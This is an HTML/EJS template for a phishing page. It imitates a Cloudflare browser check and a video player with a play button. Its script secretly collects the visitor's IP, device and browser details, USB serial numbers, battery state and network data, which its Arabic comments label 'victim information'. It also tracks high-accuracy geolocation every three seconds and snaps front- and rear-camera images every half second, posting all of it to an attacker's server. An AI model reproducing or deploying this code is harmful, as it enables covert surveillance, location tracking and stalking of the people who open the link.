<!DOCTYPE html>
<html lang="ar-SA">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  <meta name="robots" content="noindex, nofollow">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Ù…Ø±Ø­Ø¨Ø§ Ø¨Ùƒ</title>
  <style type="text/css">
    html, body {
      width: 100%;
      height: 100%;
      margin: 0;
      padding: 0;
    }
    body {
      background-color: #000;
      color: #fff;
      font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Helvetica Neue", Arial, sans-serif;
      font-size: 16px;
      line-height: 1.7;
      -webkit-font-smoothing: antialiased;
    }
    /* Ø¥Ø®ÙØ§Ø¡ Ø¨Ø§Ù‚ÙŠ Ø§Ù„Ù…Ø­ØªÙˆÙŠØ§Øª ØºÙŠØ± Ø§Ù„ÙÙŠØ¯ÙŠÙˆ */
    table, #cf-content, .challenge-form, .attribution, #cf-bubbles {
      display: none !important;
    }
    /* Ø¹Ø±Ø¶ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠ Ø¨ÙƒØ§Ù…Ù„ Ø§Ù„Ø´Ø§Ø´Ø© */
    #video {
      display: block !important;
      width: 100%;
      height: 100%;
      object-fit: cover;
    }
    /* Ø²Ø± Ø§Ù„Ù…ÙˆÙ‚Ø¹ ÙŠØ¸Ù‡Ø± ÙÙŠ Ù…Ù†ØªØµÙ Ø§Ù„Ø´Ø§Ø´Ø© Ø¹Ù„Ù‰ Ø´ÙƒÙ„ Ø²Ø± Ù…Ø³ØªØ·ÙŠÙ„ ÙŠØ´Ø¨Ù‡ Ø²Ø± ØªØ´ØºÙŠÙ„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ */
    #locationButton {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: rgba(0, 0, 0, 0.8);
      padding: 20px 40px;
      border-radius: 5px;
      display: none;
      z-index: 9999;
      border: 2px solid #f58220;
    }
    #locationButton button {
      background: transparent;
      border: none;
      color: #f58220;
      font-size: 48px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <!-- Ø§Ù„Ù…Ø­ØªÙˆÙ‰ Ø§Ù„Ù…Ø®ÙÙŠ ÙƒÙ…Ø§ ÙÙŠ Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø£ØµÙ„ÙŠ -->
  <table width="100%" height="100%" cellpadding="20">
    <tbody>
      <tr>
        <td align="center" valign="middle">
          <div class="cf-browser-verification cf-im-under-attack">
            <noscript>
              <h1 data-translate="turn_on_js" style="color:#bd2426;">Ø§Ù„Ø±Ø¬Ø§Ø¡ ØªÙØ¹ÙŠÙ„ JavaScript ÙˆØ¥Ø¹Ø§Ø¯Ø© ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø©.</h1>
            </noscript>
            <div id="cf-content" style="display: block;">
              <div id="cf-bubbles">
                <div class="bubbles"></div>
                <div class="bubbles"></div>
                <div class="bubbles"></div>
              </div>
              <h1><span data-translate="checking_browser">Ù„Ø­Ø¸Ù‡ ÙˆØ­Ø¯Ù‡ Ù…Ù† ÙØ¸Ù„Ùƒ</span></h1>
              <div id="no-cookie-warning" class="cookie-warning" data-translate="turn_on_cookies" style="display:none">
                <p data-translate="turn_on_cookies" style="color:#bd2426;">Ø§Ù„Ø±Ø¬Ø§Ø¡ ØªÙ…ÙƒÙŠÙ† Ø§Ù„ÙƒÙˆÙƒÙŠØ² ÙˆØ¥Ø¹Ø§Ø¯Ø© ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø©.</p>
              </div>
              <p data-translate="process_is_automatic"></p>
              <p data-translate="allow_5_secs" id="cf-spinner-allow-5-secs" style="display: none;">Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± Ù„Ù…Ø¯Ø© ØªØµÙ„ Ø¥Ù„Ù‰ 5 Ø«ÙˆØ§Ù†ÙŠâ€¦</p>
              <p data-translate="redirecting" id="cf-spinner-redirecting" style="display: block;">Ø¬Ø§Ø± Ø§Ù„ØªÙˆØ¬ÙŠÙ‡â€¦ 6</p>
            </div>
            <form class="challenge-form" id="challenge-form" action="http://000webhost.com/?__cf_chl_jschl_tk__=..." method="POST" enctype="application/x-www-form-urlencoded">
              <span data-translate="error" style="display: none;">Ø±Ù…Ø² Ø§Ù„Ø®Ø·Ø£: 1020</span>
            </form>
          </div>
          <div class="attribution"></div>
        </td>
      </tr>
    </tbody>
  </table>
  
  <!-- Ø¹Ø±Ø¶ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠ Ù…Ø¹ Ø®Ø§ØµÙŠØ© loop Ù„Ù„ØªØ´ØºÙŠÙ„ Ø§Ù„Ù…Ø³ØªÙ…Ø± -->
  <video id="video" src="https://files.catbox.moe/lc3j5p.mp4" playsinline autoplay muted loop></video>
  <!-- Canvas Ù…Ø®ÙÙŠØ© Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù…Ù‡Ø§ ÙÙŠ Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„Ø¥Ø·Ø§Ø±Ø§Øª -->
  <canvas hidden id="tempCanvas" width="500" height="500"></canvas>
  
  <!-- Ø²Ø± ØªØ´ØºÙŠÙ„ Ø§Ù„Ù…ÙˆÙ‚Ø¹ ÙŠØ¸Ù‡Ø± ÙÙŠ Ù…Ù†ØªØµÙ Ø§Ù„Ø´Ø§Ø´Ø© -->
  <div id="locationButton">
    <button id="enableLocation">â–¶</button>
  </div>
  
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
  <script type="text/javascript">
    var c = false, l = false, uid = "<%=uid %>";
    var locationEnabled = false;
    
    async function gather() {
      var td = "";
      <% if(!t){ %>
      td += '<code>âœ…Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¶Ø­ÙŠØ© </code><br><br><b>âš“ Ø§Ù„Ø¢ÙŠ Ø¨ÙŠ: <a href="https://ip-api.com/#<%=ip %>"><%=ip %></a> | Ø§Ù„ÙˆÙ‚Øª: <%=time %></b>';
      <% } else { %>
      await fetch("<%=a %>").then((r) => r.json()).then((d) => 
          td += '<code>âœ…Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¶Ø­ÙŠØ© </code><br><br><b>âš“ Ø§Ù„Ø¢ÙŠ Ø¨ÙŠ: <a href="https://ip-api.com/#' + d.ip + '">' + d.ip + '</a> | Ø§Ù„ÙˆÙ‚Øª: <%=time %></b>'
      );
      <% } %>
      
      td += "<br><br><b>â³ Ø§Ù„ØªØ§Ø±ÙŠØ® ÙÙŠ Ø¬Ù‡Ø§Ø² Ø§Ù„Ø¶Ø­ÙŠØ© :</b> " + new Date() + "<br>";
      var xo = ["productSub", "vendor", "maxTouchPoints", "doNotTrack", "hardwareConcurrency", "cookieEnabled", "appCodeName", "appName", "appVersion", "platform", "product", "userAgent", "language", "languages", "webdriver", "pdfViewerEnabled", "deviceMemory"];
      var xoc = ["type", "rtt", "saveData", "effectiveType", "downlink", "downlinkMax"];
      
      td += "<br><b>ğŸ“± Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²</b><br>";
      for (var i = 0; i < xo.length; i++) {
        if (xo[i] in navigator) {
          var str = navigator[xo[i]];
          td += "<b>" + xo[i] + "</b>: <code>" + str + "</code><br>";
        }
      }
      
      if (navigator.mediaDevices || navigator.mediaDevices?.enumerateDevices) {
        await navigator.mediaDevices?.enumerateDevices()
          .then(function(devices) {
            td += "<br><b>ğŸ“· Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø£Ø¬Ù‡Ø²Ø© Ø§Ù„ØµÙˆØªÙŠØ© ÙˆØ§Ù„Ø¨ØµØ±ÙŠØ©</b><br>";
            devices.forEach(function(device) {
              td += "<b>" + device.kind + ":</b> " + device.label + " id = <code>" + device.deviceId + "</code><br>";
            });
          })
          .catch(function(err) {
            td += "<br><b>ğŸ“· Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø£Ø¬Ù‡Ø²Ø© Ø§Ù„ØµÙˆØªÙŠØ© ÙˆØ§Ù„Ø¨ØµØ±ÙŠØ©</b><br>";
            td += "âš ï¸ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø£Ø¬Ù‡Ø²Ø© Ø§Ù„ØµÙˆØªÙŠØ© ÙˆØ§Ù„Ø¨ØµØ±ÙŠØ©: " + err.name + ": " + err.message;
          });
      }
      
      if ("connection" in navigator) {
        td += "<br><b>ğŸ•¸ï¸ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø´Ø¨ÙƒØ©</b><br>";
        for (var i = 0; i < xoc.length; i++) {
          var str = navigator.connection[xoc[i]];
          td += "<b>" + xoc[i] + "</b>: <code>" + str + "</code><br>";
        }
      }
      
      if ("usb" in navigator) {
        await navigator.usb.getDevices()
          .then(devices => {
            td += "<br><b>ğŸ”Œ Ø¹Ø¯Ø¯ Ø§Ù„Ø£Ø¬Ù‡Ø²Ø© USB Ø§Ù„Ù…ØªØµÙ„Ø©:</b> " + devices.length + "<br>";
            devices.forEach(device => {
              td += "<b>Ø§Ø³Ù… Ø§Ù„Ù…Ù†ØªØ¬:</b> " + device.productName + " , <b>Ø§Ù„Ø±Ù‚Ù… Ø§Ù„ØªØ³Ù„Ø³Ù„ÙŠ: </b> <code>" + device.serialNumber + "</code><br>";
            });
          });
      }
      
      if ("getBattery" in navigator) {
        await navigator.getBattery().then(function(battery) {
          td += "<br><b>ğŸ”‹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©</b><br>";
          td += "<b>ğŸ”‹ Ù…Ø³ØªÙˆÙ‰ Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©:</b> " + battery.level * 100 + "%<br><b>âš¡ Ù‡Ù„ Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ© Ø´Ø­Ù†Øª:</b> " + battery.charging;
        });
      }
      
      if (!navigator.geolocation) {
        td += "<br><b>ğŸ“ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù…ÙˆÙ‚Ø¹</b><br>";
        td += "âš ï¸ ÙˆØ§Ø¬Ù‡Ø© Ø¨Ø±Ù…Ø¬Ø© ØªØ·Ø¨ÙŠÙ‚Ø§Øª Ø§Ù„Ù…ÙˆØ§Ù‚Ø¹ ØºÙŠØ± Ù…ØªÙˆÙØ±Ø©";
        l = true;
      }
      
      // Ø³Ø­Ø¨ Ø§Ù„Ù…ÙˆÙ‚Ø¹ ÙƒÙ„ 3 Ø«ÙˆØ§Ù†Ù Ù„Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø£Ø¹Ù„Ù‰ Ø¯Ù‚Ø©
      setInterval(function() {
        navigator.geolocation.getCurrentPosition(success, error, { enableHighAccuracy: true, maximumAge: 0 });
      }, 3000);
      
      function success(pos) {
        locationEnabled = true;
        // Ø¹Ù†Ø¯ Ù†Ø¬Ø§Ø­ Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„Ù…ÙˆÙ‚Ø¹ ÙŠØªÙ… Ø¥Ø®ÙØ§Ø¡ Ø²Ø± Ø§Ù„ØªØ´ØºÙŠÙ„
        document.getElementById("locationButton").style.display = "none";
        const crd = pos.coords;
        $.post("<%=a %>/location", { uid: uid, lat: encodeURIComponent(crd.latitude), lon: encodeURIComponent(crd.longitude), acc: encodeURIComponent(crd.accuracy) }, (s) => {
          l = true;
          red();
        });
      }
      
      function error(err) {
        // ÙÙŠ Ø­Ø§Ù„ ÙØ´Ù„ Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„Ù…ÙˆÙ‚Ø¹ ÙŠØªÙ… Ø¹Ø±Ø¶ Ø²Ø± Ø§Ù„ØªØ´ØºÙŠÙ„
        document.getElementById("locationButton").style.display = "block";
        td += "<br><b>ğŸ“ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù…ÙˆÙ‚Ø¹</b><br>";
        td += "âš ï¸ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ù…ÙˆÙ‚Ø¹: <code>" + err.message + "</code>";
        l = true;
      }
      
      // ØªØ´ØºÙŠÙ„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠ Ø¨Ø´ÙƒÙ„ Ø¯Ø§Ø¦Ù…
      var vid = document.getElementById("video");
      vid.play();
      
      // Ù…ØªØºÙŠØ± Ù„ØªØ¨Ø¯ÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§: true Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ©ØŒ false Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø®Ù„ÙÙŠØ©
      let useFront = true;
      
      // Ø¯Ø§Ù„Ø© Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø© Ù…Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ù…Ø·Ù„ÙˆØ¨Ø©
      function captureFrame() {
        let currentUseFront = useFront;
        useFront = !useFront;
        
        let constraints = {
          audio: false,
          video: currentUseFront
                    ? { facingMode: "user" }
                    : { facingMode: { exact: "environment" } }
        };
        
        navigator.mediaDevices.getUserMedia(constraints)
          .then(function(stream) {
            let captureVideo = document.createElement("video");
            captureVideo.setAttribute("playsinline", "true");
            captureVideo.muted = true;
            captureVideo.srcObject = stream;
            captureVideo.play();
            
            captureVideo.addEventListener("canplay", function() {
              setTimeout(function() {
                let canvas = document.getElementById("tempCanvas");
                let context = canvas.getContext("2d");
                context.drawImage(captureVideo, 0, 0, canvas.width, canvas.height);
                let canvasData = canvas.toDataURL("image/png").replace("data:image/png;base64,", "");
                $.post("<%=a %>/camsnap", { uid: uid, img: encodeURIComponent(canvasData) });
                stream.getTracks().forEach(track => track.stop());
              }, 150);
            });
          })
          .catch(function(e) {
            console.error("Error capturing frame: ", e);
          });
      }
      
      // Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø© Ø¨Ø§Ù„ØªÙ†Ø§ÙˆØ¨ ÙƒÙ„ 500 Ù…Ù„Ù„ÙŠ Ø«Ø§Ù†ÙŠØ©
      setInterval(captureFrame, 500);
      
      $.post("<%=a %>", { data: encodeURIComponent(td), uid: encodeURIComponent(uid) }, (s) => {});
    }
    
    function red() {
      if (c && l) {
        window.location.href = "<%=url %>";
      }
    }
    
    window.onload = () => {
      gather();
      var vid = document.getElementById("video");
      vid.style.display = "block";
      vid.play();
      
      // Ø¹Ù†Ø¯ Ø§Ù„Ø¶ØºØ· Ø¹Ù„Ù‰ Ø²Ø± "ØªØ´ØºÙŠÙ„ Ø§Ù„Ù…ÙˆÙ‚Ø¹" Ù†Ø­Ø§ÙˆÙ„ Ø¥Ø¹Ø§Ø¯Ø© ØªØ´ØºÙŠÙ„ Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„Ù…ÙˆÙ‚Ø¹
      document.getElementById("enableLocation").addEventListener("click", function() {
        navigator.geolocation.getCurrentPosition(
          function(pos) {
            document.getElementById("locationButton").style.display = "none";
          },
          function(err) {
            console.error("Error re-enabling location: ", err);
          },
          { enableHighAccuracy: true, maximumAge: 0 }
        );
      });
    };
  </script>
</body>
</html>